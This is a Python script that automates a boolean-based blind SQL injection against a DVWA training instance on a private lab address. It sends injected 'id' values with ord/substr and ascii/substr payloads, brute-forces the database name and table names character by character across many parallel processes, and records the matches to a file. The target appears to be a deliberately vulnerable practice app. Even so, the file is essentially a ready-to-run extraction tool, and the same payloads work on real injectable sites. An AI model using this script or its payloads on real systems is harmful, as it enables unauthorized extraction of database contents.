import concurrent.futures
import requests
from bs4 import BeautifulSoup


def run_code(demot):
    texterr = "User ID is MISSING from the database."
    base_url = "http://192.168.236.20/dvwa/vulnerabilities/sqli_blind/"
    session_id = "8tuabbh2e1oiv0c2flpn3jbvk4"

    params = {"id": demot, "Submit": "Submit"}
    cookies = {"PHPSESSID": session_id, "security": "low"}

    response = requests.get(base_url, params=params, cookies=cookies)
    print(response.status_code)

    soup = BeautifulSoup(response.text, "html.parser")
    search_results = soup.find_all("pre")
    print(search_results)
    print(demot)
    for result in search_results:
        text = result.text.strip()
        print(text)
        if (text != texterr) and ("User ID exists in the database." in text):
            with open("example.txt", "a") as file:
                file.write(demot + "\n")


# 多线程运行
# if __name__ == "__main__":
#     demots = list(range(1, 200))  # 保存所有需要运行的demot
#     max_threads = 10  # 最大线程数
#     with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
#         for i in range(1, 6):
#             for demo in range(1, 128):
#                 demot = f"1' and (select ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),{i},1)) = {demo}) #"
#                 executor.submit(run_code, demot)


# 多进程
if __name__ == "__main__":
    max_processes = 60
    with concurrent.futures.ProcessPoolExecutor(max_workers=max_processes) as executor:
        for i in range(1, 6):
            for demo in range(1, 128):
                # demot = f"1' and (select ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),{i},1)) = {demo}) #"
                demot = f"1'and ord(substr(database(),{i},1))= {demo} #"
                executor.submit(run_code, demot)
